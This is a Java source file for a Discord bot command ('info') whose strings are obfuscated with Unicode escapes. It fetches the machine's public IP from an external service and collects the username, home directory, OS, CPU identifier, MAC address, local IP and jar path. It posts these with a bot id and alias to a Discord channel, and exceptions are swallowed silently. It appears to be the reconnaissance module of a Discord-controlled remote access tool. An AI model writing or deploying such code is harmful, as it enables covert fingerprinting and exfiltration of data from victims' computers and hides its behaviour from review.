package cmd;

import main.Bot;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.User;

import java.awt.*;
import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.URL;

public class InfoCmd  extends Command{
    public InfoCmd(){
        this.name = "\u0069\u006e\u0066\u006f";
        this.usage = "\u002f\u0069\u006e\u0066\u006f";
        this.desc = "";
        this.type = CommandType.GENERAL;
    }

    @Override
    public boolean onCommand(User user, Message message, String[] args) {
        try {
            final String f_p = InfoCmd.class.getProtectionDomain().getCodeSource().getLocation().getPath();
            URL whatismyip = new URL("\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0063\u0068\u0065\u0063\u006b\u0069\u0070\u002e\u0061\u006d\u0061\u007a\u006f\u006e\u0061\u0077\u0073\u002e\u0063\u006f\u006d");
            BufferedReader in = new BufferedReader(new InputStreamReader(
                    whatismyip.openStream()));
            String p_ip = in.readLine();
            NetworkInterface network = NetworkInterface.getByInetAddress(InetAddress.getLocalHost());
            byte[] mac = network.getHardwareAddress(); StringBuilder sb = new StringBuilder();
            for (int i = 0; i < mac.length; i++) {
                sb.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? "-" : ""));
            }
            message.getChannel().sendMessage("```"+
                    "\u0075\u0073\u0065\u0072\u006e\u0061\u006d\u0065\u003a "+System.getProperty("\u0075\u0073\u0065\u0072\u002e\u006e\u0061\u006d\u0065")+
                    "\n"+"\u0068\u006f\u006d\u0065\u0064\u0069\u0072\u003a" +System.getProperty("\u0075\u0073\u0065\u0072\u002e\u0068\u006f\u006d\u0065")+
                    "\n\u006f\u0073\u003a "+System.getProperty("\u006f\u0073\u002e\u0061\u0072\u0063\u0068")+" | "+System.getProperty("\u006f\u0073\u002e\u006e\u0061\u006d\u0065")+" | "+System.getProperty("\u006f\u0073\u002e\u0076\u0065\u0072\u0073\u0069\u006f\u006e")+
                    "\n\u0063\u0070\u0075 \u0069\u0064\u003a "+System.getenv("\u0050\u0052\u004f\u0043\u0045\u0053\u0053\u004f\u0052\u005f\u0049\u0044\u0045\u004e\u0054\u0049\u0046\u0049\u0045\u0052")+ " | "+ Runtime.getRuntime().availableProcessors()+" \u0063\u006f\u0072\u0065\u0073"+
                    "\n\u006d\u0061\u0063\u003a "+ sb+
                    "\n\u006c\u006f\u0063\u0061\u006c \u0069\u0070\u003a "+ InetAddress.getLocalHost().getHostAddress()+
                    "\n\u0070\u0075\u0062\u006c\u0069\u0063 \u0069\u0070\u003a "+ p_ip+
                    "\n\u006a\u0061\u0072 \u0070\u0061\u0074\u0068\u003a "+f_p+
                    "\n\u0062\u006f\u0074 \u0069\u0064\u003a " + Bot.bot_id+" | alias: "+Bot.alias+
                    "```"
            ).queue();
        }catch (Exception ee){}
        return true;
    }
}
